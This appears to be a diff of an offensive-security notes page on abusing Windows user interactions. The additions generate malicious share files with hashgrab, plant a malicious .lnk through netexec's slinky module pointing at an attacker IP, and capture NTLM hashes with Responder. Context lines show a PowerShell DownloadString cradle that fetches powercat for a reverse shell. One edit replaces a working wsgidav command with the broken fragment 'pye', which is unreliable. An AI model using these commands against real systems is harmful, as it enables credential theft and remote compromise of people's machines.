@@ -10,7 +10,7 @@ tags:
 ---
 # Abusing Windows User interactions
 
-Users are sometimes the weakest link in an organization.
+Users are sometimes the weakest link in an organization. 
 
 ## Traffic Capture
 
@@ -18,6 +18,20 @@ It is always worth running `tcpdump` or `Wireshark` for a while to see what 
 
 - Wireshark: While not highly likely, if `Wireshark` is installed on a box that we land on, it is worth attempting a traffic capture to see what we can pick up. Unprivileged users may be able to capture network traffic, as the option to restrict Npcap driver access to Administrators only is not enabled by default. 
 - The tool [net-creds](https://github.com/DanMcInerney/net-creds) can be run from our attack box to sniff passwords and hashes from a live interface or a pcap file.
+
+
+Tool for generating malicious files:
+
+[https://github.com/xct/hashgrab](https://github.com/xct/hashgrab)
+
+```
+# Install
+git clone https://github.com/xct/hashgrab.git
+
+# Generate the files that you will upload to the share indicating as ip the ip where you would like to relay the authentication
+python3 hashgrab.py <ip> <output> 
+```
+
 
 ## Process Command Lines
 
@@ -195,6 +209,23 @@ $lnk.Save()
 ```
 
 
+## .lnk File Attack: Capturing Hashes with a Malicious .lnk File PART 2, generated with -M slinky 
+
+If a share has READ/WRITE access, then you can create a malicious.lnk by using the slinky module:
+
+```
+nxc smb $ip 0 -d nara-security.com -u 'guest' -p '' -M slinky -o NAME=malicious SERVER='192.168.45.172'
+
+# Server is the attacker IP
+```
+
+Just have ready the responder to capture hashes:
+
+```
+sudo responder -w -d -I tun0
+```
+
+
 ## ## Windows Library File attack
 
 "Library files attacks" in Windows typically refer to **DLL hijacking** and the abuse of **`.library-ms` files** to execute malicious code, steal credentials, or evade defenses.
@@ -214,7 +245,7 @@ mkdir /home/kali/webdav
 
 cd /home/kali/webdav
 
-wsgidav --host=0.0.0.0 --port=80 --root=/home/kali/webdav --auth=anonymous 
+pye
 ```
 
 
@@ -288,7 +319,7 @@ powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://1
 So we need, a http listener in port 8000 serving powercat.ps1:
 
 ```
-python -m http.server 80000
+python -m http.server 8000
 ```
 
 A netcat listener ready to receive a  connection in port 4444:
